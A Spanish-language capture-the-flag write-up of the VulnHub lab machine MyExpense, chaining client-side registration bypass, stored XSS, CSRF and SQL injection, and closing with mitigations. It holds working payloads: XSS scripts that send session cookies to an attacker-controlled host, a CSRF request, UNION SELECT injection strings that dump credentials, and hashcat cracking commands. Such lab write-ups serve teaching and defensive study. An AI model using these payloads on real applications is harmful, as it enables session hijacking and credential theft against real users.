# Writeup - MyExpense (VulnHub)

**Máquina:** MyExpense  
**Plataforma:** VulnHub  
**Sistema:** Linux  
**IP:** 192.168.1.165  
**Objetivo:** Explotar una aplicación web de gestión de gastos mediante una cadena de vulnerabilidades (XSS, CSRF, SQLi) para obtener la flag.

---

## Índice

1. [Reconocimiento de red](#1-reconocimiento-de-red)
2. [Escaneo de puertos y servicios](#2-escaneo-de-puertos-y-servicios)
3. [Enumeración web](#3-enumeración-web)
4. [Bypass de registro de usuario](#4-bypass-de-registro-de-usuario)
5. [Cross-Site Scripting (XSS) y Cookie Hijacking](#5-cross-site-scripting-xss-y-cookie-hijacking)
6. [Cross-Site Request Forgery (CSRF)](#6-cross-site-request-forgery-csrf)
7. [Escalada lateral - Robo de sesión del Manager](#7-escalada-lateral---robo-de-sesión-del-manager)
8. [SQL Injection - Extracción de credenciales](#8-sql-injection---extracción-de-credenciales)
9. [Flag](#9-flag)
10. [Resumen de vulnerabilidades](#10-resumen-de-vulnerabilidades)
11. [Mitigaciones](#11-mitigaciones)

---

## 1. Reconocimiento de red

Descubrimos hosts activos en la red local mediante ARP scanning:

```bash
sudo arp-scan -I eth0 --localnet
```

Identificamos la IP objetivo (`192.168.1.165`) y establecemos una variable de entorno para facilitar los comandos posteriores:

```bash
export TARGET="192.168.1.165"
```

Verificamos conectividad y determinamos el sistema operativo analizando el TTL del paquete ICMP:

```bash
ping -c 1 $TARGET
```

TTL=64 → Sistema Linux.

---

## 2. Escaneo de puertos y servicios

Realizamos un escaneo completo de puertos TCP:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $TARGET -oG allPorts
```

Puertos abiertos detectados:

| Puerto | Servicio |
|--------|----------|
| 80/tcp | HTTP |
| 33791/tcp | Desconocido |
| 45179/tcp | Desconocido |
| 49915/tcp | Desconocido |
| 55329/tcp | Desconocido |

Lanzamos scripts de reconocimiento y detección de versiones sobre los puertos abiertos:

```bash
nmap -sCV -p80,33791,45179,49915,55329 -vvv $TARGET -oN targeted
```

El puerto 80 aloja un servidor web que contiene una aplicación de gestión de gastos ("MyExpense").

---

## 3. Enumeración web

### 3.1. Intento de autenticación inicial

Las credenciales proporcionadas en la descripción de la máquina (`samuel:fzghn4lw`) no funcionan en el panel de login de la página principal.

### 3.2. Fuzzing de directorios

Descubrimos rutas ocultas con **gobuster**:

```bash
gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20
```

Encontramos el directorio `/admin`. Fuzzeamos dentro de él buscando archivos PHP:

```bash
gobuster dir -u http://$TARGET/admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x php
```

Resultados relevantes:

- `/admin/index.php` — Panel de login administrativo
- `/admin/admin.php` — Panel de administración (usuarios, gastos)
- `/admin/logout.php` — Cierre de sesión

### 3.3. Identificación de usuarios

En `/admin/admin.php` se listan los usuarios registrados. Observamos que el usuario **slamotte** aparece como **inactive**.

Al hacer clic en "inactive", el sistema intenta activar la cuenta, pero requiere permisos de administrador.

---

## 4. Bypass de registro de usuario

### 4.1. Login como samuel — Cuenta bloqueada

Al intentar autenticarnos como `samuel` en `/admin/index.php`, el sistema indica que la cuenta está bloqueada.

### 4.2. Botón de registro deshabilitado

La página de registro (`/admin/index.php`) tiene el botón de creación de cuenta deshabilitado mediante el atributo HTML `disabled`.

Inspeccionamos el elemento con las herramientas de desarrollador (`Ctrl+Shift+C`):

Eliminamos el atributo `disabled` del DOM:

```html
<!-- Antes -->
<input type="submit" name="create" value="Create your account" disabled>
<!-- Después -->
<input type="submit" name="create" value="Create your account">
```

### 4.3. Creación de cuenta

Creamos una cuenta con credenciales controladas (ej: `attacker:password123`).

Verificamos en `/admin/admin.php` que el usuario aparece correctamente en la lista (aunque en estado **inactive**).

---

## 5. Cross-Site Scripting (XSS) y Cookie Hijacking

### 5.1. Detección de XSS

El formulario de registro es vulnerable a XSS almacenado (Stored XSS). Creamos un nuevo usuario con un payload JavaScript en el campo `username`:

```javascript
<script>alert("XSS")</script>
```

Al acceder al panel de administración, el script se ejecuta, confirmando la vulnerabilidad.

### 5.2. Preparación del ataque de cookie hijacking

Iniciamos un servidor HTTP para capturar peticiones entrantes:

```bash
python3 -m http.server 80
```

Registramos otro usuario con un payload que carga un script externo desde nuestra máquina atacante (`192.168.1.147`):

```javascript
<script src="http://192.168.1.147/pwned.js"></script>
```

### 5.3. Creación del payload de robo de cookies

Creamos el archivo `pwned.js` que exfiltrará las cookies del navegador de la víctima:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.147/?cookie=' + document.cookie);
request.send();
```

### 5.4. Captura de cookies

Esperamos a que un usuario administrativo visite la página donde está nuestro payload XSS. Al cargarse, el navegador solicita `pwned.js` a nuestro servidor, y recibimos una petición con la cookie de sesión del administrador.

### 5.5. Suplantación de sesión (Cookie Hijacking)

Con las herramientas de desarrollador (`Ctrl+Shift+C`), reemplazamos el valor de nuestra cookie por la cookie robada (especificando path para que sobrescriba la actual):

```
document.cookie = "PHPSESSID=<valor_robado>; path=/admin/";
```

Al recargar `/admin/admin.php`, observamos que tenemos acceso como administrador, pero la sesión está activa y no podemos realizar acciones directamente.

---

## 6. Cross-Site Request Forgery (CSRF)

### 6.1. Estrategia

Aprovechamos que el administrador está navegando activamente por la aplicación. Podemos hacer que su navegador ejecute una petición de activación de usuario sin su consentimiento (CSRF).

### 6.2. Identificación de la petición objetivo

Al hacer clic en "inactive" junto al usuario que queremos activar, observamos la siguiente petición GET:

```
http://192.168.1.165/admin/admin.php?id=11&status=active
```

Sobrescribimos `pwned.js` con un nuevo payload que realiza esta petición automáticamente:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.165/admin/admin.php?id=11&status=active');
request.send();
```

### 6.3. Ejecución del ataque CSRF

Esperamos a que el administrador recargue la página donde está nuestro usuario malicioso. Al hacerlo, su navegador ejecutará el nuevo `pwned.js` y activará nuestra cuenta automáticamente.

### 6.4. Verificación

Iniciamos sesión con nuestra cuenta (`attacker:password123`) y comprobamos que ahora está activa.

### 6.5. Solicitud de reembolso

Una vez autenticados, navegamos a **Expense Reports** y emitimos el reporte de 750€ que estaba pendiente.

El reporte queda pendiente de aprobación por nuestro **Manager**.

---

## 7. Escalada lateral - Robo de sesión del Manager

### 7.1. Identificación del Manager

En nuestro perfil de usuario, encontramos el nombre de nuestro manager asignado.

### 7.2. Ataque XSS vía chat

La aplicación dispone de un chat interno. Enviamos un mensaje que contiene un payload XSS que carga un script externo:

```javascript
<script src="http://192.168.1.147:4646/pwned.js"></script>
```

Creamos `pwned.js` en el puerto 4646 con el payload de robo de cookies:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.147:4646/?cookie=' + document.cookie);
request.send();
```

Iniciamos el servidor en el puerto 4646:

```bash
python3 -m http.server 4646
```

### 7.3. Captura de cookie del Manager

Al cabo de unos segundos, recibimos varias peticiones con cookies de diferentes usuarios.

Probamos cada cookie hasta encontrar la del manager. Con su sesión, aprobamos el reporte de 750€.

### 7.4. Necesidad del Financial Approver

Al inspeccionar el perfil del manager, descubrimos que su superior (Financial Approver) debe aprobar el gasto final, pero no está conectado en ese momento.

---

## 8. SQL Injection - Extracción de credenciales

### 8.1. Detección de SQLi

Al no poder robar la cookie del Financial Approver, probamos una inyección SQL en el parámetro `id` de `site.php`:

```
http://192.168.1.165/site.php?id=2'
```

El mensaje de error revela que la consulta es vulnerable a SQL Injection.

### 8.2. Enumeración de columnas

Determinamos el número de columnas con `ORDER BY`:

```
http://192.168.1.165/site.php?id=2 order by 2-- -
```

```
http://192.168.1.165/site.php?id=2 order by 3-- -
```

(Error → la tabla tiene exactamente 2 columnas).

### 8.3. Inyección UNION SELECT

Verificamos la inyección con `UNION SELECT`:

```
http://192.168.1.165/site.php?id=2 union select 1,2-- -
```

### 8.4. Enumeración de bases de datos

Obtenemos el nombre de la base de datos en uso:

```
http://192.168.1.165/site.php?id=2 union select 1,user()-- -
http://192.168.1.165/site.php?id=2 union select 1,database()-- -
```

Extraemos todas las bases de datos disponibles:

```
http://192.168.1.165/site.php?id=2 union select 1,schema_name from information_schema.schemata-- -
```

Bases de datos encontradas: `information_schema`, `myexpense`, `mysql`, `performance_schema`, `phpmyadmin`, `sys`.

### 8.5. Enumeración de tablas

Listamos las tablas de la base de datos `myexpense`:

```
http://192.168.1.165/site.php?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
```

Tablas encontradas: `user`, `expense`, `chat`.

### 8.6. Enumeración de columnas

Obtenemos las columnas de la tabla `user`:

```
http://192.168.1.165/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```

Columnas relevantes: `id`, `username`, `password`, `role`, `email`, `manager`.

### 8.7. Extracción de credenciales

Volcamos los usuarios y sus contraseñas (hasheadas):

```
http://192.168.1.165/site.php?id=2 union select 1,group_concat(username,0x3a,password) from myexpense.user-- -
```

Procesamos el resultado para separar los pares usuario:hash en líneas individuales:

```bash
tr ',' '\n' < credenciales.txt > hashes.txt
```

### 8.8. Cracking de hashes con hashcat

Identificamos el tipo de hash (MD5) y lo crackeamos con el rockyou. Usamos `--username` para que hashcat ignore el prefijo `username:`:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
```

### 8.9. Autenticación como Financial Approver

Iniciamos sesión con las credenciales del Financial Approver y aprobamos nuestra propia solicitud de reembolso.

---

## 9. Flag

Volvemos a iniciar sesión con nuestra cuenta (`attacker:password123`) y obtenemos la flag de finalización.

```text
<REDACTED>
```

Máquina completada.

---

## 10. Resumen de vulnerabilidades

| # | Vulnerabilidad | Descripción | Impacto |
|---|---|---|---|
| 1 | **Control de acceso insuficiente** | Botón de registro deshabilitado solo por atributo HTML `disabled` del lado cliente | Creación de cuentas no autorizadas |
| 2 | **Stored XSS** | Los nombres de usuario y mensajes de chat no sanitizan entrada JavaScript | Robo de cookies de sesión |
| 3 | **CSRF** | Las acciones críticas (activar usuario, aprobar gastos) se realizan vía GET sin token anti-CSRF | Modificación de estado de cuentas y aprobaciones fraudulentas |
| 4 | **SQL Injection** | Parámetro `id` en `site.php` no sanitizado | Extracción completa de la base de datos (credenciales) |
| 5 | **Contraseñas débiles** | Los hashes de contraseñas son crackeables | Acceso a cuentas privilegiadas |

---

## 11. Mitigaciones

1. **Validación del lado servidor** — No confiar en atributos HTML `disabled` para control de acceso.
2. **Sanitización de entrada** — Escapar o rechazar caracteres `<`, `>` y `"` en campos de usuario.
3. **Tokens CSRF** — Implementar tokens anti-CSRF en todas las operaciones que modifican estado.
4. **Consultas parametrizadas (Prepared Statements)** — Prevenir SQL Injection usando consultas con parámetros vinculados.
5. **HttpOnly y Secure flags en cookies** — Evitar que `document.cookie` acceda a cookies de sesión.
6. **Política de Contraseñas** — Exigir contraseñas robustas y almacenar con algoritmos seguros (bcrypt, argon2).
